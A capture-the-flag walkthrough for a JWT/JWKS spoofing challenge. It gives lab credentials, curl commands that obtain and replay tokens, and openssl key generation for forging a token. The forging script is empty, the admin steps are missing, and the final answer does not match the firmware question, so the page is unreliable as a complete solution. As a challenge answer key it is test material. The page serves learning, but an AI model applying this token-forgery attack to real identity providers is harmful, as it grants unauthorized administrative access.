---
icon: material/text-box-outline
---

# Rogue Gnome Identity Provider

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_0.png)

**Difficulty**: :fontawesome-solid-star::fontawesome-solid-star::fontawesome-regular-star::fontawesome-regular-star::fontawesome-regular-star:<br/>
**Direct link**: [Rogue_Gnome_Identity_Provider](https://hhc25-wetty-prod.holidayhackchallenge.com/?&challenge=termRogueGnome)


## Hints
??? tip "Rogue Gnome IDP"
   It looks like the JWT uses JWKS. Maybe a JWKS spoofing attack would work.
??? tip "Rogue Gnome IDP"
    https://github.com/ticarpi/jwt_tool/wiki and https://portswigger.net/web-security/jwt have some great information on analyzing JWT's and performing JWT attacks.
??? tip "Rogue Gnome IDP"
    If you need to host any files for the attack, the server is running a webserver available locally at http://paulweb.neighborhood/.<br/> 
    The files for the site are stored in ~/www <br/>

## Objective

!!! question "Request"
   Hike over to Paul in the park for a gnomey authentication puzzle adventure. What malicious firmware image are the gnomes downloading?

??? quote "Janusz Jasinski"
As a pentester, I proper love a good privilege escalation challenge, and that's exactly what we've got here.<br/>
The challenge website notes the router firmware version and the hardware version at the bottom.<br/>
I've got access to a Gnome's Diagnostic Interface at gnome-48371.atnascorp with the creds gnome:SittingOnAShelf, but it's just a low-privilege account.<br/>
The gnomes are getting some dodgy updates, and I need admin access to see what's actually going on.<br/>
Ready to help me find a way to bump up our access level, yeah?

## Solution

The challenge console mentions a file named ~/notes. </br>

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_1.png)


```
## Captured Gnome:
curl http://gnome-48371.atnascorp/

## ATNAS Identity Provider (IdP):
curl http://idp.atnascorp/

## My CyberChef website:
curl http://paulweb.neighborhood/
### My CyberChef site html files:
~/www/


# Credentials

## Gnome credentials (found on a post-it):
Gnome:SittingOnAShelf


# Curl Commands Used in Analysis of Gnome:

## Gnome Diagnostic Interface authentication required page:
curl http://gnome-48371.atnascorp

## Request IDP Login Page
curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth

## Authenticate to IDP
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login

## Pass Auth Token to Gnome
curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>

## Access Gnome Diagnostic Interface
curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface

## Analyze the JWT
jwt_tool.py <insert-JWT>
```
We follow the below steps in the below order : <br/>

 - In the challenge
    - Authenticate and get the JWT token
    - Pass Auth Token to Gnome
 - In local kali
    - Create the private and public key pair
    - Generate the JWKS content
    - Generate the JWT content with JWKS url
 - In the challenge
    - Use JWT to generate the session id for admin user
    - Use session id to authenticate as admin

### Authenticate and get the JWT token

```
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
```

![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_2.png)

```bash linenums="1" title="JWT token"
eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
```

### Pass Auth Token to Gnome
```
curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
```
We get a session id. <br/>
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_3.png)


When we try to get the session cookie value to access the diagnostic interface, we get "Diagnostic access is only available to admins."<br/>
```
curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aTpHxg.wy7rETOD5wTKVvfzoJmz5SRH0g0' http://gnome-48371.atnascorp/diagnostic-interface
```
![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_4.png)


So - question is how we can get a authenticate to the gnome-48371.atnascorp to get an admin session which we can use to access teh diagnostic interface?

### Creating the private and public key pair
```
openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
openssl rsa -in private.pem -pubout -out public.pem
```

### Generate jwks payload - create_jwks.py
```bash linenums="1" title="create_jwks.py"
```


!!! success "Answer"
   SprinklesAndPackets2025!

## Response
!!! quote "Janusz Jasinski"
    Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.<br/>
    Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.